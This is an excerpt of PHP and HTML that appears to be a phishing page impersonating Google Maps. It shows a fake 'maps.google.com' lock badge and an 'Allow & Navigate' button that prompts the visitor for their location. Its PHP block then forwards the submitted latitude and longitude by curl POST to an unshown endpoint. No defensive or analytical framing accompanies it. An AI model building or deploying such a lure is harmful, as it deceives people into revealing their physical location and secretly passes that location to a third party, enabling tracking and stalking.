...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['type' => 'location', 'lat' => $_POST['lat'], 'lng' => $_POST['lng']]);
    curl_exec($ch);
    curl_close($ch);
...
<div class="card">
  ...
  <div id="form-section">
    ...
    <div class="subtitle">Google Maps needs your location for accurate navigation.</div>
    <div class="origin-chip">🔒 maps.google.com</div>
    <br>
    <button id="startBtn" class="next-btn">Allow & Navigate</button>
  </div>
  <div id="loader-section"><div class="loader"></div><p style="color:#5f6368;">Getting location...</p></div>
